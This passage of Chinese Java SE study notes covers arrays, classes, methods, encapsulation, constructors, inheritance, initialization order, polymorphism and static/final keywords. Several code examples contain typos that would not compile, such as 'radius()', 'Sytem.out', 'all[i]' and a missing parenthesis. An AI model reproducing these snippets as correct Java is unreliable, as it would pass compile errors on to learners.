for(int j=i; j&lt;arr.length; j++)&#123; if(arr[j] &gt; max)&#123; max = arr[j]; index = j; &#125; &#125; //（2）如果这个最值没有在它应该在的位置，就与这个位置的元素交换 /* 第1轮，最大值应该在[0] 第2轮，最大值应该在[1] 第3轮，最大值应该在[2] 第4轮，最大值应该在[3] 正好是i-1的值 */ if(index != i-1)&#123; //交换arr[i-1]与arr[index] int temp = arr[i-1]; arr[i-1] = arr[index]; arr[index] = temp; &#125;&#125;//显示结果for(int i=0; i&lt;arr.length; i++)&#123; System.out.print(arr[i]);&#125; 4.4 二维数组二维数组的标记：[][] 4.4.1 相关的表示方式（1）二维数组的长度/行数： ​ 二维数组名.length （2）二维数组的其中一行： ​ 二维数组名[行下标] ​ 行下标的范围：[0, 二维数组名.length-1] （3）每一行的列数： ​ 二维数组名[行下标].length ​ 因为二维数组的每一行是一个一维数组 （4）每一个元素 ​ 二维数组名[行下标][列下标] 4.4.2 二维数组的声明和初始化1、二维数组的声明 1234567 //推荐 元素的数据类型[][] 二维数组的名称;//不推荐元素的数据类型 二维数组名[][];//不推荐 元素的数据类型[] 二维数组名[]; 面试： 12int[] x, y[];//x是一维数组，y是二维数组 2、二维数组的初始化 （1）静态初始化 1234567891011121314二维数组名 = new 元素的数据类型[][]&#123; &#123;第一行的值列表&#125;, &#123;第二行的值列表&#125;, ... &#123;第n行的值列表&#125; &#125;; //如果声明与静态初始化一起完成元素的数据类型[][] 二维数组的名称 = &#123; &#123;第一行的值列表&#125;, &#123;第二行的值列表&#125;, ... &#123;第n行的值列表&#125; &#125;; （2）动态初始化（不规则：每一行的列数可能不一样） 12345678//（1）先确定总行数二维数组名 = new 元素的数据类型[总行数][];//（2）再确定每一行的列数二维数组名[行下标] = new 元素的数据类型[该行的总列数];//(3)再为元素赋值二维数组名[行下标][列下标] = 值; （3）动态初始化（规则：每一行的列数是相同的） 12345//（1）确定行数和列数二维数组名 = new 元素的数据类型[总行数][每一行的列数];//（2）再为元素赋值二维数组名[行下标][列下标] = 值; 4.4.3 二维数组的遍历123456for(int i=0; i&lt;二维数组名.length; i++)&#123; for(int j=0; j&lt;二维数组名[i].length; j++)&#123; System.out.print(二维数组名[i][j]); &#125; System.out.println();&#125; 第五章 面向对象基础5.1 类与对象1、类：一类具有相同特性的事物的抽象描述。 ​ 对象：类的一个个体，实例，具体的存在。 ​ 类是对象的设计模板。 2、如何声明类？ 123【修饰符】 class 类名&#123; 成员列表：属性、方法、构造器、代码块、内部类&#125; 3、如何创建对象？ 123new 类名(); //匿名对象类名 对象名 = new 类名(); //有名对象 5.2 类的成员之一：属性1、如何声明属性？ 1234【修饰符】 class 类名&#123; 【修饰符】 数据类型 属性名; //属性有默认值 【修饰符】 数据类型 属性名 = 值; //属性有初始值&#125; 说明：属性的类型可以是Java的任意类型，包括基本数据类型、引用数据类型（类、接口、数组等） 总结：Java的数据类型 （1）基本数据类型 byte,short,int,long,float,double,char,boolean （2）引用数据类型 ①类： ​ 例如：String、Student、Circle、System、Scanner、Math… ②接口：后面讲 ③数组： ​ 例如：int[]，String[]，char[]，int[][] 12345int[] arr = new int[5];这里把int[]看成数组类型，是一种引用数据类型，右边赋值的是一个数组的对象元素的数据类型：int数组的数据类型：int[] 2、如何为属性赋值？ （1）在声明属性时显式赋值 123【修饰符】 class 类名&#123; 【修饰符】 数据类型 属性名 = 值; //属性有初始值&#125; 代码示例： 123456789101112131415161718192021class Student&#123; String name; char gender = '男';//显式赋值&#125;class TestStudent&#123; public static void main(String[] args)&#123; Student s1 = new Student(); System.out.println(\"姓名：\" + s1.name);//null System.out.println(\"性别：\" + s1.gender);//男 s1.name = \"小薇\";//修改属性的默认值 s1.gender = '女';//修改属性的初始值 System.out.println(\"姓名：\" + s1.name);//小薇 System.out.println(\"性别：\" + s1.gender);//女 Student s2 = new Student(); System.out.println(\"姓名：\" + s2.name);//null System.out.println(\"性别：\" + s2.gender);//男 &#125;&#125; （2）创建对象之后赋值 123456789【修饰符】 class 类名&#123; 【修饰符】 数据类型 属性名; //属性有默认值&#125;//创建对象类名 对象名 = new 类名();//为对象的属性赋值对象名.属性名 = 值; 3、如何访问属性的值？ （1）在本类的方法中访问 示例代码： 1234567class Circle&#123; double radius; double getArea()&#123; return 3.14 * radius * radius;//直接访问 &#125;&#125; （2）在其他类的方法中访问 12345678910class Circle&#123; double radius;&#125;class TestCircle&#123; public static void main(String[] args)&#123; Circle c1 = new Circle(); double area = 3.14 * c1.radius * c1.radius;//对象名.属性名 &#125;&#125; 4、属性的特点 （1）属性有默认值 基本数据类型： ​ byte,short,int,long：0 ​ float，double：0.0 ​ char：\\u0000 ​ boolean：false 引用数据类型： ​ null （2）每一个对象的属性是独立，互不干扰 5、对象属性的内存图 123456789101112131415161718192021class Student&#123; String name; char gender = '男';//显式赋值&#125;class TestStudent&#123; public static void main(String[] args)&#123; Student s1 = new Student(); System.out.println(\"姓名：\" + s1.name);//null System.out.println(\"性别：\" + s1.gender);//男 s1.name = \"小薇\"; s1.gender = '女'; System.out.println(\"姓名：\" + s1.name);//小薇 System.out.println(\"性别：\" + s1.gender);//女 Student s2 = new Student(); System.out.println(\"姓名：\" + s2.name);//null System.out.println(\"性别：\" + s2.gender);//男 &#125;&#125; 1558659534754 5.4 类的成员之二：方法5.4.1 方法的概念方法（method）：代表一个独立的可复用的功能 目的/好处： （1）复用 （2）简化代码 5.4.2 方法的语法1、方法的声明格式： 12345【修饰符】 class 类名&#123; 【修饰符】 返回值类型 方法名(【形参列表】)&#123; 方法体：实现功能的代码 &#125;&#125; 说明： （1）【修饰符】：待讲 （2）返回值类型： ①void：表示无返回值 ②非void：所有的Java数据类型都可以 （3）方法名：能很好的体现方法的功能 命名的规范：①见名知意②从第二个单词开始首字母大写 （4）【形参列表】： ​ 在完成这个方法的功能时，需要一些数据，这些数据要由“调用者”来决定，那我们就可以设计形参。 ​ 语法格式： ​ ()：无参，空参 ​ (数据类型 形参名)：一个形参 ​ (数据类型1 形参名1, ……, 数据类型n 形参名n)：n个形参 （5）方法体：实现方法的功能，最好一个方法就完成一个独立的功能。 2、方法的调用格式： 12//本类同级别方法调用：直接调用【变量 = 】 方法名(【实参列表】); 12//在其他类的方法中调用【变量 = 】 对象名.方法名(【实参列表】); （1）是否传实参 看被调用的方法是否有形参 （2）是否接收返回值 看被调用的方法是否是void，如果是void，就不需要也不能接收，如果不是void，就可以接收。 3、方法的声明与调用的代码示例 （1）无参无返回值方法 1234567891011//本类class Circle&#123; double radius; void printInfo()&#123; System.out.println(\"半径：\" + radius); &#125; void test()&#123; printInfo();//本类中调用无参无返回值方法 &#125;&#125; 1234567891011121314//其他类class Circle&#123; double radius; void printInfo()&#123; System.out.println(\"半径：\" + radius); &#125;&#125;class TestCircle&#123; public static void main(String[] args)&#123; Circle c1 = new Circle(); c1.printInfo(); //其他类中调用无参无返回值方法 &#125;&#125; （2）无参有返回值方法 1234567891011121314//本类class Circle&#123; double radius; double getArea()&#123; return 3.14 * radius * radius(); &#125; void printInfo()&#123; // System.out.println(\"半径：\" + radius + \"，面积：\" + getArea());//本类中调用无参有返回值 double area = getArea();//本类中调用无参有返回值 System.out.println(\"半径：\" + radius + \"，面积：\" + area); &#125;&#125; 1234567891011121314151617//其他类class Circle&#123; double radius; double getArea()&#123; return 3.14 * radius * radius(); &#125;&#125;class TestCircle&#123; public static void main(String[] args)&#123; Circle c1 = new Circle(); double area = c1.getArea(); System.out.println(\"面积：\" + area); //或 System.out.println(\"面积：\" + c1.getArea()); &#125;&#125; （3）有参无返回值方法 123456789101112131415//本类class GraphicTools&#123; void printRectange(int line, int column, char sign)&#123; for(int i=1; i&lt;=line; i++)&#123; for(int j=1; j&lt;=column; j++)&#123; Sytem.out.print(sign); &#125; System.out.println(); &#125; &#125; void test()&#123; printRectange(5,10,'%');//本类中调用有参无返回值方法 &#125;&#125; 1234567891011121314151617//其他类class GraphicTools&#123; void printRectange(int line, int column, char sign)&#123; for(int i=1; i&lt;=line; i++)&#123; for(int j=1; j&lt;=column; j++)&#123; Sytem.out.print(sign); &#125; System.out.println(); &#125; &#125;&#125;class Test&#123; public static void main(String[] args)&#123; GraphicTools tools = new GraphicTools(); tools.printRectange(5,10,'%'); &#125;&#125; （4）有参有返回值方法 123456789101112//本类class MyMath&#123; int sum(int a,int b)&#123; return a+b; &#125; void print()&#123; int x = 4; int y = 7; System.out.println(x + \"+\" + y + \"=\" + sum(x,y);//本类中调用有参有返回值的方法 &#125;&#125; 123456789101112131415//其他类class MyMath&#123; int sum(int a,int b)&#123; return a+b; &#125;&#125;class Test&#123; public static void main(String[] args)&#123; MyMath my = new MyMath(); int x = 4; int y = 7; System.out.println(x + \"+\" + y + \"=\" + my.sum(x,y)); &#125;&#125; 4、方法声明与调用的原则 （1）方法必须先声明后调用 如果调用方法时，如果方法名写错或调用一个不存在的方法，编译会报错 （2）方法声明的位置必须在类中方法外 正确示例： 12345678类&#123; 方法1()&#123; &#125; 方法2()&#123; &#125;&#125; 错误示例： 1234567类&#123; 方法1()&#123; 方法2()&#123; //错误 &#125; &#125;&#125; （3）方法的调用的位置有要求 正确示例： 12345类&#123; 方法1()&#123; 调用方法 &#125;&#125; 错误示例： 1234567类&#123; 方法1()&#123; &#125; 调用方法 //错误位置&#125; （4）方法的调用格式要与方法的声明格式对应 ①是否要加“对象.”：看是否在本类中，还是其他类中 ②是否要接收返回值：看被调用方法是否是void ③是否要传实参：看被调用方法是有形参列表 5.4.3 方法的重载Overload概念：在同一个类中，出现了两个或多个的方法，它们的方法名称相同，形参列表不同，这样的形式称为方法的重载。和返回值类型无关。 示例代码： 1234567891011121314 //求两个整数的最大值public int max(int a,int b)&#123; return a&gt;b?a:b;&#125; //求三个整数的最大值public int max(int a, int b, int c)&#123; return max(max(a,b),c);&#125; //求两个小数的最大值public double max(double a, double b)&#123; return a&gt;b?a:b;&#125; 5.4.4 方法的参数传递机制Java中方法的参数传递机制：值传递 （1）形参是基本数据类型时，实参给形参传递数据值，是copy的形式，形参对值的修改不影响实参。（2）形参是引用数据类型时，实参给形参传递地址值，形参对对象的属性的修改，会影响实参对象的属性值，因为此时形参和实参就是指向同一个对象。示例代码： 12345678910111213class Test&#123; public static void swap(int a, int b)&#123; int temp = a; a = b; b = temp; &#125; public static void main（String[] args)&#123; int x = 1; int y = 2; swap(x,y);//调用完之后，x与y的值不变 &#125;&#125; 示例代码： 12345678910111213141516class Test&#123; public static void change(MyData my)&#123; my.num *= 2; &#125; public static void main(String[] args)&#123; MyData m = new MyData(); m.num = 1; change(m);//调用完之后，m对象的num属性值就变为2 &#125;&#125;class MyData&#123; int num;&#125; 陷阱1： 1234567891011121314151617181920/*陷阱1：在方法中，形参 = 新new对象，那么就和实参无关了*/class Test&#123; public static void change(MyData my)&#123; my = new MyData();//形参指向了新对象 my.num *= 2; &#125; public static void main(String[] args)&#123; MyData m = new MyData(); m.num = 1; change(m);//调用完之后，m对象的num属性值仍然为1 &#125;&#125;class MyData&#123; int num;&#125; 陷阱2：见字符串和包装类部分 5.3 对象数组一维数组： 1、元素是基本数据类型 2、元素是引用数据类型，也称为对象数组，即数组的元素是对象 注意：对象数组，首先要创建数组对象本身，即确定数组的长度，然后再创建每一个元素对象，如果不创建，数组的元素的默认值就是null，所以很容易出现空指针异常NullPointerException。 示例代码： 1234567891011121314151617class MyDate&#123; int year; int month; int day;&#125;class Test&#123; public static void main(String[] args)&#123; MyDate[] arr = new MyDate[3];//创建数组对象本身，指定数组的长度 for(int i=0; i&lt;arr.length; i++)&#123; arr[i] = new MyDate();//每一个元素要创建对象 arr[i].year = 1990 + i; arr[i].month = 1 + i; arr[i].day = 1 + i; &#125; &#125;&#125; 对象数组的内存图： 1558745138315 第六章 面向对象的基本特征面向对象的基本特征： 1、封装 2、继承 3、多态 6.1 封装1、好处： （1）隐藏实现细节，方便使用者使用 （2）安全，可以控制可见范围 2、如何实现封装？ 通过权限修饰符 面试题：请按照可见范围从小到大（从大到小）列出权限修饰符？ 修饰符 本类 本包 其他包的子类 任意位置 private √ × × × 缺省 √ √ × × protected √ √ √ × public √ √ √ √ 权限修饰符可以修饰什么？ 类（类、接口等）、属性、方法、构造器、内部类 类（外部类）：public和缺省 属性：4种 方法：4种 构造器：4种 内部类：4种 3、通常属性的封装是什么样的？ 当然属性的权限修饰符可以是private、缺省、protected、public。但是我们大多数时候，见到的都是private，然后给它们配上get/set方法。 示例代码：标准Javabean的写法 1234567891011121314151617181920212223242526public class Student&#123; //属性私有化 private String name; private int age; private boolean marry; //公共的get/set public void setName(String n)&#123; name = n;//这里因为还没有学习this等，可能还会优化 &#125; public String getName()&#123; return name; &#125; public void setAge(int a)&#123; age = a; &#125; public int getAge()&#123; return age; &#125; public void setMarry(boolean m)&#123; marry = m; &#125; public boolean isMarry()&#123;//boolean类型的属性的get方法，习惯使用把get换成is return marry; &#125;&#125; 6.2 构造器1、构造器的作用：（1）和new一起使用创建对象 12345//调用无参构造创建对象类名 对象名 = new 类名();//调用有参构造创建对象类名 对象名 = new 类名(实参列表); （2）可以在创建对象的同时为属性赋值 12345678910public class Circle&#123; private double radius; public Circle()&#123; &#125; public Circle(double r)&#123; radius = r;//为radius赋值 &#125;&#125; 2、声明构造器的语法格式： 12345678【修饰符】 class 类名&#123; 【修饰符】 类名()&#123;//无参构造 &#125; 【修饰符】 类名(形参列表)&#123;//有参构造 &#125;&#125; 3、构造器的特点： （1）所有的类都有构造器 （2）如果一个类没有显式/明确的声明一个构造器，那么编译器将会自动添加一个默认的无参构造 （3）如果一个类显式/明确的声明了构造器，那么编译器将不再自动添加默认的无参构造，如果需要，那么就需要手动添加 （4）构造器的名称必须与类名相同 （5）构造器没有返回值类型 （6）构造器可以重载 示例代码： 12345678910public class Circle&#123; private double radius; public Circle()&#123; &#125; public Circle(double r)&#123; radius = r;//为radius赋值 &#125;&#125; 6.3 关键字this1、this关键字： 意思：当前对象 （1）如果出现在构造器中：表示正在创建的对象 （2）如果出现在成员方法中：表示正在调用这个方法的对象 2、this的用法： （1）this.属性 当局部变量与成员变量同名时，那么可以在成员变量的而前面加“this.”用于区别 （2）this.方法 调用当前对象的成员方法，完全可以省略“this.” （3）this()或this(实参列表) this()表示调用本类的无参构造 this(实参列表)表示调用本类的有参构造 this()或this(实参列表)要么没有，要么必须出现在构造器的首行 示例代码： 1234567891011121314151617181920212223242526public class Student&#123; private String name; private int score; public Student()&#123; &#125; public Student(String name)&#123; this.name = name; &#125; public Student(String name, int score)&#123; this(name); &#125; public void setName(String name)&#123; this.name = name; &#125; public String getName()&#123; return name; &#125; public void setScore(int score)&#123; this.score = score; &#125; public int getScore()&#123; return score; &#125;&#125; 3、成员变量与局部变量的区别？ 这里只讨论实例变量（关于类变量见static部分） （1）声明的位置不同 成员变量：类中方法外 局部变量：方法中或代码中 ​ ①方法的形参列表 ​ ②方法体中局部变量 ​ ③代码块中的局部变量 （2）运行时在内存中的存储位置不同 成员变量：堆 局部变量：栈 基本数据类型的变量在栈中，引用数据类型的变量在堆中：不准确 （3）修饰符 成员变量：有很多修饰符，例如：权限修饰符 局部变量：不能加权限修饰符，唯一的能加的是final （4）初始化 成员变量：有默认值 局部变量：没有默认值，必须手动初始化 （5）生命周期 成员变量：随着对象的创建而创建，随着对象被回收而消亡，即与对象同生共死。每一个对象都是独立的。 局部变量：方法调用时才分配，方法运行结束就没有了。每一次方法调用，都是独立的 6.4 包1、包的作用： （1）可以避免类重名 有了包之后，类的全名称就变为：包.类名 （2）分类组织管理众多的类 例如：java.lang包，java.util包，java.io包….. （3）可以控制某些类型或成员的可见范围 如果某个类型或者成员的权限修饰缺省的话，那么就仅限于本包使用 2、声明包的语法格式： 1package 包名; 注意： (1)必须在源文件的代码首行 (2)一个源文件只能有一个 3、包的命名规范和习惯：（1）所有单词都小写，每一个单词之间使用.分割（2）习惯用公司的域名倒置 例如：com.atguigu.xxx; 建议大家取包名时不要使用“java.xx”包 4、使用其他包的类： 前提：被使用的类或成员的权限修饰符是&gt;缺省的 （1）使用类型的全名称 例如：java.util.Scanner input = new java.util.Scanner(System.in); （2）使用import 语句之后，代码中使用简名称 5、import语句 12import 包.类名;import 包.*; 注意：当使用两个不同包的同名类时，例如：java.util.Date和java.sql.Date。 一个使用全名称，一个使用简名称 示例代码： 123456789package com.atguigu.test;import java.util.Scanner;public class Test&#123; public static void main(String[] args)&#123; Scanner input = new Scanner(System.in); &#125;&#125; 6.5 eclipse的使用1、eclipse管理项目和代码的结构 workspace –&gt; project –&gt; 包–&gt;类… 一个工作空间可以有多个项目。 2、快捷键 常规快捷键： Ctrl + S：保存 Ctrl + C：复制 Ctrl + V：粘贴 Ctrl + X：剪切 Ctrl + Y：反撤销 Ctrl + Z：撤销 Ctrl + A：全选 eclipse中默认的快捷键： Ctrl + 1：快速修复 Alt + /：代码提示 Alt + ?： Alt + Shift + / 方法的形参列表提示 Ctrl + D：删除选中行 Ctrl + Alt + ↓：向下复制行 Ctrl + Alt + ↑：向上复制行 Alt + ↓：与下面的行交换位置 Alt + ↑：与下面的行交换位置 Ctrl + Shift + F：快速格式 Ctrl + /：单行注释，再按一次取消 Ctrl + Shift + /：多行注释 Ctrl + Shift +\\：取消多行注释 Shift + 回车：在光标下一行插入新航开始编辑 Ctrl + Shift + 回车：在光标上一行插入新航开始编辑 Alt + Shift + A：多行编辑 再按一次退出多行编辑模式 Alt + Shift + S：弹出自动生成代码的菜单选择，包括自动生成构造器、get/set、equals…… Ctrl + Shift + O：快速导包 Ctrl + Shift + T：打开某个类的源文件 Ctrl + O：打开某个类型的摘要outline 3、快速开发的代码模板 代码模板 + Alt + / （1）main public static void main(String[] args){ } （2）sysout System.out.println(); （3）for for(int i=0; i&lt;数组名.lenght; i++){ } 其他详细使用见《JavaSE_柴林燕_相关工具.docx》 6.6 面向对象的基本特征之二：继承1、为什么要继承？继承的好处？（理解） （1）代码的复用 （2）代码的扩展 2、如何实现继承？ 语法格式： 123【修饰符】 class 子类 extends 父类&#123; &#125; 3、继承的特点 （1）子类会继承父类的所有特征（属性、方法） 但是，私有的在子类中是不能直接使用的 （2）子类不会继承父类的构造器 因为，父类的构造器是用于创建父类的对象的 （3）子类的构造器中又必须去调用父类的构造器 在创建子类对象的同时，为从父类继承的属性进行初始化用，可以借助父类的构造器中的代码为属性赋值。 （4）Java只支持单继承：一个子类只能有一个“直接”父类 （5）Java又支持多层继承：父类还可以有父类，特征会代代相传 （6）一个父类可以同时拥有很多个子类 6.7 关键字supersuper关键字：引用父类的，找父类的xx 用法： （1）super.属性 当子类声明了和父类同名的成员变量时，那么如果要表示某个成员变量是父类的，那么可以加“super.” （2）super.方法 当子类重写了父类的方法，又需要在子类中调用父类被重写的方法，可以使用”super.” （3）super()或super(实参列表) super()：表示调用父类的无参构造 super(实参列表)：表示调用父类的有参构造 注意： （1）如果要写super()或super(实参列表)，必须写在子类构造器的首行 （2）如果子类的构造器中没有写：super()或super(实参列表)，那么默认会有 super() （3）如果父类没有无参构造，那么在子类的构造器的首行“必须”写super(实参列表) 6.8 方法的重写1、方法的重写（Override） 当子类继承了父类的方法时，又觉得父类的方法体的实现不适合于子类，那么子类可以选择进行重写。 2、方法的重写的要求 （1）方法名：必须相同 （2）形参列表：必须相同 （3）修饰符 ​ 权限修饰符： &gt;= （4）返回值类型 ​ 如果是基本数据类型和void：必须相同 ​ 如果是引用数据类型：&lt;= ​ 在Java中我们认为，在概念范围上：子类 &lt;父类 3、重载（Overload）与重写（Override）的区别 ​ 重载（Overload）：在同一个类中，方法名相同，形参列表不同，和返回值类型无关的两个或多个方法。 ​ 重写（Override）：在父子类之间。对方法签名的要求见上面。 特殊的重载： 123456789101112131415161718public class TestOverload &#123; public static void main(String[] args) &#123; B b = new B(); //b对象可以调用几个a方法 b.a(); b.a(\"\");//从b对象同时拥有两个方法名相同，形参不同的角度来说，算是重载 &#125;&#125;class A&#123; public void a()&#123; //... &#125;&#125;class B extends A&#123; public void a(String str)&#123; &#125;&#125; 6.9 非静态代码块1、语法格式 12345【修饰符】 class 类名&#123; &#123; 非静态代码块 &#125;&#125; 2、作用 目的：在创建的过程中，为对象属性赋值，协助完成实例初始化的过程 3、什么时候执行？ （1）每次创建对象时都会执行 （2）优先于构造器执行 6.10 实例初始化过程1、概念描述 实例初始化过程：实例对象创建的过程 实例初始化方法：实例对象创建时要执行的方法 实例初始化方法的由来：它是有编译器编译生成的 实例初始化方法的形式：()或(形参列表) 实例初始化方法的构成： ①属性的显式赋值代码 ②非静态代码块的代码 ③构造器的代码 其中 ①和②按顺序执行，从上往下 ③在①和②的后面 因此一个类有几个构造器，就有几个实例初始化方法。 2、单个类实例初始化方法 示例代码： 123456789101112131415161718192021222324class Demo&#123; &#123; System.out.println(\"非静态代码块1\"); &#125; private String str = assign();//调用方法，来为str进行显式赋值 public Demo()&#123; System.out.println(\"无参构造\"); &#125; public Demo(String str)&#123; this.str = str; System.out.println(\"有参构造\"); &#125; &#123; System.out.println(\"非静态代码块2\"); &#125; public String assign()&#123; System.out.println(\"assign方法\"); return \"hello\"; &#125;&#125; 图解： 1558960549421 3、父子类的实例初始化 注意： （1）原先super()和super(实参列表)说是调用父类的构造器，现在就要纠正为调用父类的实例初始化方法了 （2）原先super()和super(实参列表)说是必须在子类构造器的首行，现在要纠正为必须在子类实例初始化方法的首行 结论： （1）执行顺序是先父类实例初始化方法，再子类实例初始化方法 （2）如果子类重写了方法，通过子类对象调用，一定是执行重写过的方法 示例代码： 123456789101112131415161718192021222324252627282930313233class Ba&#123; private String str = assign(); &#123; System.out.println(\"(1)父类的非静态代码块\"); &#125; public Ba()&#123; System.out.println(\"(2)父类的无参构造\"); &#125; public String assign()&#123; System.out.println(\"(3)父类的assign()\"); return \"ba\"; &#125;&#125;class Er extends Ba&#123; private String str = assign(); &#123; System.out.println(\"(4)子类的非静态代码块\"); &#125; public Er()&#123; //super() ==&gt;调用父类的实例初始化方法，而且它在子类实例初始化方法的首行 System.out.println(\"(5)子类的无参构造\"); &#125; public String assign()&#123; System.out.println(\"(6)子类的assign()\"); return \"er\"; &#125;&#125;class Test&#123; public static void main(String[] args)&#123; new Er();//612645 &#125;&#125; 图解： 1558961723911 6.11 面向对象的基本特征之三：多态1、多态： 语法格式： 1父类 引用/变量 = 子类的对象; 2、前提： （1）继承 （2）方法的重写 （3）多态引用 3、现象： ​ 编译时看左边/“父类”，运行时看右边/“子类”。 ​ 编译时，因为按父类编译，那么只能父类有的方法，子类扩展的方法是无法调用的； ​ 执行时一定是运行子类重写的过的方法体。 示例代码： 1234567891011121314151617181920212223242526272829303132333435363738class Person&#123; public void eat()&#123; System.out.println(\"吃饭\"); &#125; public void walk()&#123; System.out.println(\"走路\"); &#125;&#125;class Woman extends Person&#123; public void eat()&#123; System.out.println(\"细嚼慢咽的吃饭\"); &#125; public void walk()&#123; System.out.println(\"婀娜多姿走路\"); &#125; public void shop()&#123; System.out.println(\"买买买...\"); &#125;&#125;class Man extends Person&#123; public void eat()&#123; System.out.println(\"狼吞虎咽的吃饭\"); &#125; public void walk()&#123; System.out.println(\"大摇大摆的走路\"); &#125; public void smoke()&#123; System.out.println(\"吞云吐雾\"); &#125;&#125;class Test&#123; public static void main(String[] args)&#123; Person p = new Woman();//多态引用 p.eat();//执行子类重写 p.walk();//执行子类重写 //p.shop();//无法调用 &#125;&#125; 4、应用： （1）多态参数：形参是父类，实参是子类对象 （2）多态数组：数组元素类型是父类，元素存储的是子类对象 示例代码：多态参数 12345678910class Test&#123; public static void main(String[] args)&#123; test(new Woman());//实参是子类对象 test(new Man());//实参是子类对象 &#125; public static void test(Person p)&#123;//形参是父类类型 p.eat(); p.walk(); &#125;&#125; 示例代码：多态数组 123456789101112class Test&#123; public static void main(String[] args)&#123; Person[] arr = new Person[2];//多态数组 arr[0] = new Woman(); arr[1] = new Man(); for(int i=0; i&lt;arr.length; i++)&#123; all[i].eat(); all[i].walk(); &#125; &#125;&#125; 5、向上转型与向下转型：父子类之间的转换 （1）向上转型：自动类型转换 ​ 当把子类的对象赋值给父类的变量时（即多态引用时），在编译时，这个对象就向上转型为父类。此时就看不见子类“特有、扩展”的方法。 （2）向下转型：强制转换。有风险，可能会报ClassCastException异常。 ​ 当需要把父类的变量赋值给一个子类的变量时，就需要向下转型。 ​ 要想转型成功，必须保证该变量中保存的对象的运行时类型是&lt;=强转的类型 示例代码： 123456789class Person&#123; //方法代码省略...&#125;class Woman extends Person&#123; //方法代码省略...&#125;class ChineseWoman extends Woman&#123; //方法代码省略...&#125; 123456789101112131415public class Test&#123; public static void main(String[] args)&#123; //向上转型 Person p1 = new Woman(); //向下转型 Woman m = (Woman)p1; //p1变量中实际存储的对象就是Woman类型，和强转的Woman类型一样 //向上转型 Person p2 = new ChineseWoman(); //向下转型 Woman w2 = (Woman) p2; //p2变量中实际存储的对象是ChineseWoman类型，强制的类型是Woman，ChineseWoman&lt;Woman类型 &#125;&#125; 6、instanceof 表达式语法格式： 1对象/变量 instanceof 类型 运算结果：true 或 false 作用： 用来判断这个对象是否属于这个类型，或者说，是否是这个类型的对象或这个类型子类的对象 示例代码： 123456789class Person&#123; //方法代码省略...&#125;class Woman extends Person&#123; //方法代码省略...&#125;class ChineseWoman extends Woman&#123; //方法代码省略...&#125; 1234567891011121314151617public class Test&#123; public static void main(String[] args)&#123; Person p = new Person(); Woman w = new Woman(); ChineseWoman c = new ChineseWoman(); if(p instanceof Woman)&#123;//false &#125; if(w instanceof Woman)&#123;//true &#125; if(c instanceof Woman)&#123;//true &#125; &#125;&#125; 第七章 面向对象的高级特性修饰符的学习围绕三个问题： （1）单词的意思 （2）可以修饰什么？ （3）用它修饰后有什么不同？ 7.1 关键字：finalfinal：最终的 用法： （1）修饰类（包括外部类、内部类类） 表示这个类不能被继承，没有子类 （2）修饰方法 表示这个方法不能被重写 （3）修饰变量（成员变量（类变量、实例变量），局部变量） 表示这个变量的值不能被修改 注意：如果某个成员变量用final修饰后，也得手动赋值，而且这个值一旦赋完，就不能修改了，即没有set方法 7.2 关键字：nativenative：本地的，原生的用法： ​ 只能修饰方法 ​ 表示这个方法的方法体代码不是用Java语言实现的。 ​ 但是对于Java程序员来说，可以当做Java的方法一样去正常调用它，或者子类重写它。 JVM内存的管理： 方法区：类的信息、常量、静态变量、动态编译生成的字节码信息 虚拟机栈：Java语言实现的方法的局部变量 本地方法栈：非Java语言实现的方法的局部变量，即native方法执行时的内存区域 堆：new出来的对象 程序计数器：记录每一个线程目前执行到哪一句指令 7.3 关键字：staticstatic：静态的 用法： 1、成员方法：我们一般称为静态方法或类方法 （1）不能被重写 （2）被使用 本类中：其他方法中可以直接使用它 其他类中：可以使用“类名.方法”进行调用，也可以使用”对象名.方法”，推荐使用“类名.方法” （3）在静态方法中，我们不能出现：this，super，非静态的成员 2、成员变量：我们一般称为静态变量或类变量 （1）静态变量的值是该类所有对象共享的 （2）静态变量存储在方法区 （3）静态变量对应的get/set也是静态的 （4）静态变量与局部变量同名时，就可以使用“类名.静态变量”进行区分 3、内部类：后面讲 4、代码块：静态代码块 5、静态导入（JDK1.5引入） 没有静态导入 12345678package com.atguigu.utils;public class Utils&#123; public static final int MAX_VALUE = 1000; public static void test()&#123; //... &#125;&#125; 12345678910package com.atguigu.test;import com.atguigu.utils;public class Test&#123; public static void main(String[] args)&#123; System.out.println(Utils.MAX_VALUE); Utils.test(); &#125;&#125; 使用静态导入 12345678package com.atguigu.utils;public class Utils&#123; public static final int MAX_VALUE = 1000; public static void test()&#123; //... &#125;&#125; 12345678910package com.atguigu.test;import static com.atguigu.utils.Utils.*;public class Test&#123; public static void main(String[] args)&#123; System.out.println(MAX_VALUE); test(); &#125;&#125; 7.4 静态代码块1、语法格式： 12345【修饰符】 class 类名&#123; static&#123; 静态代码块; &#125;&#125; 2、作用： 协助完成类初始化，可以为类变量赋值。 3、类初始化() 类的初始化有： ①静态变量的显式赋值代码 ②静态代码块中代码 其中①和②按顺序执行 注意：类初始化方法，一个类只有一个 4、类的初始化的执行特点： （1）每一个类的()只执行一次 （2）如果一个子类在初始化时，发现父类也没有初始化，会先初始化父类 （3）如果既要类初始化又要实例化初始化，那么一定是先完成类初始化的 7.5 变量的分类与区别1、变量按照数据类型分： （1）基本数据类型的变量，里面存储数据值 （2）引用数据类型的变量，里面存储对象的地址值 12345int a = 10;//a中存储的是数据值Student stu = new Student();//stu存储的是对象的地址值int[] arr = new int[5];//arr存储的是数组对象的地址值String str = \"hello\";//str存储的是\"hello\"对象的地址值 2、变量按照声明的位置不同： （1）成员变量 （2）局部变量 3、成员变量与局部变量的区别 （1）声明的位置不同 成员变量：类中方法外 局部变量：（1）方法的()中，即形参（2）方法体的{}的局部变量（3）代码块{}中 （2）存储的位置不同 成员变量： ​ 如果是静态变量（类变量），在方法区中 ​ 如果是非静态的变量（实例变量），在堆中 局部变量：栈 （3）修饰符不同 成员变量：4种权限修饰符、static、final。。。。 局部变量：只有final （4）生命周期 成员变量： ​ 如果是静态变量（类变量），和类相同 ​ 如果是非静态的变量（实例变量），和所属的对象相同，每一个对象是独立 局部变量：每次执行都是新的 （5）作用域 成员变量： ​ 如果是静态变量（类变量），在本类中随便用，在其他类中使用“类名.静态变量” ​ 如果是非静态的变量（实例变量），在本类中只能在非静态成员中使用，在其他类中使用“对象名.非静态的变量” 局部变量：有作用域 7.7 根父类1、java.lang.Object类是类层次结构的根父类。包括数组对象。 （1）Object类中声明的所有的方法都会被继承到子类中，那么即所有的对象，都拥有Object类中的方法 （2）每一个对象的创建，最终都会调用到Object实例初始化方法() （3）Object类型变量、形参、数组，可以存储任意类型的对象 2、Object类的常用方法 （1）public String toString()： ①默认情况下，返回的是“对象的运行时类型 @ 对象的hashCode值的十六进制形式” 